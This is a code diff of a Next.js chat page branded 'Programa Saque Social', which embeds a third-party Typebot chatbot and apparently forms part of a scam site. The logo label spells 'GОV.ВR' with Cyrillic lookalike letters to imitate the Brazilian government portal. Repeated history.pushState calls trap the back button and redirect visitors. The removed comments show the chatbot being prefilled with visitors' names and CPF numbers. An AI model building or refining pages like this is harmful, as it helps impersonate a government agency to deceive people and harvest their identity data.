@@ -4,7 +4,6 @@
 import React, { useState, useEffect, Suspense } from 'react';
 import Head from 'next/head';
 import Image from 'next/image';
-// import Script from 'next/script'; // No longer using next/script for Typebot
 import { useSearchParams, useRouter } from 'next/navigation';
 import { MoreVertical, Cookie, LayoutGrid, User, Menu, Search } from 'lucide-react';
 import '../chat-page.css'; // Styles specific to this chat page
@@ -14,12 +13,12 @@ function ChatPageContent() {
   const searchParams = useSearchParams();
   const [isLoading, setIsLoading] = useState(true);
   const [headerUserName, setHeaderUserName] = useState('Usuário');
-  // const [isTypebotScriptLoaded, setIsTypebotScriptLoaded] = useState(false); // No longer needed
 
   useEffect(() => {
     const urlBackRedirect = '/back/index.html';
-    const query = searchParams.toString();
-    const trimmedUrlBackRedirect = urlBackRedirect.trim() + (urlBackRedirect.includes("?") ? '&' : '?') + query;
+    // Capture searchParams on initial mount
+    const currentQuery = searchParams.toString();
+    const trimmedUrlBackRedirect = urlBackRedirect.trim() + (urlBackRedirect.includes("?") ? '&' : '?') + currentQuery;
 
     history.pushState({}, "", window.location.href);
     history.pushState({}, "", window.location.href);
@@ -44,7 +43,7 @@ function ChatPageContent() {
       window.removeEventListener('popstate', handlePopState);
       clearTimeout(loadingTimer);
     };
-  }, [searchParams]);
+  }, []); // Changed dependency to empty array
 
   useEffect(() => {
     const typebotElement = document.querySelector('typebot-standard');
@@ -59,11 +58,6 @@ function ChatPageContent() {
             Typebot.initStandard({
               typebot: "24lkdef", // Your Typebot ID
               apiHost: "https://chat.bestbot.info", // Your Typebot API host if self-hosted
-              // You can pass prefillVariables if needed, e.g.:
-              // prefillVariables: {
-              //  name: searchParams.get('nome') || '',
-              //  cpf: searchParams.get('cpf') || '',
-              // }
             });
           } else {
             console.error('Typebot.initStandard not found on imported module:', module);
@@ -83,11 +77,10 @@ function ChatPageContent() {
     <>
       <Head>
         <title>Programa Saque Social - Atendimento</title>
-        {/* Preload the Typebot module for potential performance improvement */}
-        <link rel="modulepreload" href="https://cdn.jsdelivr.net/npm/@typebot.io/js@0.3.59/dist/web.js" />
+        {/* Removed modulepreload link as we are using npm package */}
       </Head>
       
-      <div className="chat-page-body">
+      <div className="chat-page-body"> {/* This class should ideally be on document.body for global styles like overflow:hidden */}
         {isLoading && (
           <div id="loading-screen">
             <svg className="blink-logo" width="148" height="45" viewBox="0 0 148 45" aria-label="GОV.ВR">
